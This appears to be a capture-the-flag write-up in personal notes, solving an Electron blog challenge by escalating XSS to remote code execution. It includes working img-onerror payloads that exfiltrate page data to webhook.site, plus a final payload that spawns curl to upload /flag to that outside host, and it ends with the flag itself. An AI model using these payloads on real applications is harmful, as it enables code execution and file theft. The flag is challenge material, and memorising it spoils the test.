---
created: 2024-06-21T22:48
updated: 2024-07-08T00:41
tags:
  - fav
---

## Analysis

- Seems to be XSS, but the flag is stored on the file system `/flag`.
- It's an electron app
## Probing

First let's prob it with a bunch of XSS payloads, check fields on `window` etc.

To prevent the script from running on my own computer, I've set a `localStorage` item called `no-go`.

```html
<img src =q onerror="if(!localStorage.getItem('no-go')){
					 window.addEventListener('load', async () => {
	setTimeout(()=>{location='https://webhook.site/?w='+document.body.innerHTML.replace(/\s+/g,'');},1000)
	 });}">

<img src =q onerror="if(!localStorage.getItem('no-go'))window.addEventListener('load', async () => {
	setTimeout(()=>{location='https://webhook.site/?w='+JSON.stringify(Object.keys(window));},1000)
	 });">
	 
<img src =q onerror="if(!localStorage.getItem('no-go'))window.addEventListener('load', async () => {try{
	const replaceWithTypes = obj => Object.fromEntries(Object.entries(obj).map(([k, v]) => [k, [typeof v, typeof v === 'function'?v.toString():v]]));
	location='https://webhook.site/?w='+JSON.stringify(replaceWithTypes(window.__Process$));
	}catch(e){
location='https://webhook.site/?w='+String(e);
}});">
```

```html
<navclass="mb-3navbarnavbar-expand-lgbg-body-tertiary"><divclass="container"><aclass="navbar-brand"href="/">Blog</a></div></nav><divclass="container"><h1class="mb-3">w</h1><divid="content"class="mb-3"><imgsrc="q"onerror="if(!localStorage.getItem('no-go'))window.addEventListener('load',async()=>{setTimeout(()=>{location='https://webhook.site/?w=' document.body.innerHTML.replace(/\s /g,'');},1000)});"></div><formmethod="post"action="/report/cccc208b-9e06-4ed5-8ff3-35ebe90fa330"><buttontype="submit"class="btnbtn-secondary">Report</button></form></div><footerid="admin-footer"class="mt-3p-3bg-light"><divclass="container">Adminconsole<spanid="app-version">0.0.1</span>,Node.js<spanid="node-version">20.11.1</span>,Chromium<spanid="chrome-version">124.0.6367.230</span>,Electron<spanid="electron-version">30.0.8</span>,<spanid="kernel-info">Linux74e6f3ed79eb6.1.92-99.174.amzn2023.x86_64
```

Other than that, nothing interesting.

> `window.__Process$` was just a dummy `process` object with no real use.

---
## Electron RCE

```js
const win = new BrowserWindow({
	width: 800,
	height: 600,
	webPreferences: {
		preload: path.join(__dirname, "preload.js"),
		contextIsolation: false,
		sandbox: false,
	},
});
```

With some googling I found out that `contextIsolation: false` means the renderer runs in the same context, so I am actually running on node's context.

> Failed attempt on prototype pollution
> Tried to pollute `options.shell` `options.file` etc, didn't work.

## Final Solution

```html
<img src =q onerror="if (!localStorage.getItem('no-go')) {
    let s = [];
  	console.log = (cp) => {
	  	if(!cp.spawnfile) return;
	  	const cp2 = new cp.constructor();
		cp2.spawn({ shell: true, file: 'curl', args: ['curl', '-F', 'flag=@/flag', 'https://webhook.site/'] });
		s.push('yay!')
  	};
    window.addEventListener('load', async () => {
        setTimeout(() => {
            let p = (new URLSearchParams({
                kernal: document.getElementById('kernel-info').textContent,
                logs: JSON.stringify(s),
                body: document.body.innerHTML.replace(/\s+/g, ' '),
            })).toString();
            location = 'https://webhook.site/?' + p.toString();
        }, 1000)
    });
}">
```

### Explanation

In `preload.js`

```js
...
const cp = spawn("uname", ["-a"]);
console.log(cp);
...
```

We can see that the child process object is sent to `console.log`, which we can take control over.

So we now have access to `cp`, we will create a new child process object with the command we want to run, and that is `curl`.

```js
const cp2 = new cp.constructor();
cp2.spawn({ shell: true, file: 'curl', args: ['curl', '-F', 'flag=@flag', 'https://webhook.site/'] });
```

### Simplified

```html
<img src =q onerror="{
	console.log = (cp) => {
		if(!cp.spawnfile) return;
		const cp2 = new cp.constructor();
		cp2.spawn({ shell: true, file: 'curl', args: ['curl', '-F', 'flag=@/flag', 'https://webhook.site/'] });
	};
}">
```

```flag
FLAG{r3m07e_c0d3_execu710n_v1a_3l3c7r0n}
```
